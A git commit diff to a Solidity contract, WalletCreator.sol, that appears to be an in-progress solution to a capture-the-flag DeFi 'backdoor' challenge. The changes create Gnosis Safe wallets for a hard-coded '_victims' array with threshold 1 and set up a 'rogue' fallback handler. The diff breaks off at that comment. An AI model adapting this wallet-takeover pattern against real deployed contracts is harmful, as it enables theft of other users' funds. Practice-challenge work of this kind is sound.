bc875bf3c550e9a01b6dfb4ec19db60326343f91
LeKarimDerradji <karim.derradji.pro@gmail.com>
2023-01-09 09:55:36 +0100

    figuring

--- src/Contracts/backdoor/WalletCreator.sol
+++ src/Contracts/backdoor/WalletCreator.sol
@@ -13,25 +13,38 @@ contract WalletCreator {
     // Address of the Gnosis Safe proxy factory contract
     address immutable gnosisSafeProxyFactory;
 
+    address immutable fallbackHandler;
+
+    address immutable paymentToken;
+
     WalletRegistry immutable walletRegistry;
+
+    address[4] private _victims;
+
+    uint256 private constant MAX_THRESHOLD = 1;
 
     constructor(
         address gnosisSafeMasterCopy_,
         address gnosisSafeProxyFactory_,
-        WalletRegistry walletRegistry_
+        WalletRegistry walletRegistry_,
+        address[4] memory victims_,
+        address fallbackHandler_,
+        address paymentToken_
     ) {
         gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
         gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
         walletRegistry = walletRegistry_;
+        _victims = victims_;
+        fallbackHandler = fallbackHandler_;
+        paymentToken = paymentToken_;
     }
 
+    // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
+    // A fallback handler can be replaced or extended anytime via a regular Safe transaction
+    // (respecting threshold and owners of the Safe).
     function createGnosisSafeWallet(
-        address[] memory _owners,
-        uint256 _threshold,
         address to,
         bytes memory data,
-        address fallbackHandler,
-        address paymentToken,
         uint256 payment,
         address payable paymentReceiver
     ) public {
@@ -47,8 +60,8 @@ contract WalletCreator {
         /// @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)
         bytes memory initializer = abi.encodeWithSignature(
             "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-            _owners,
-            _threshold,
+            _victims,
+            MAX_THRESHOLD,
             to,
             data,
             // We need a fallback that's rogue
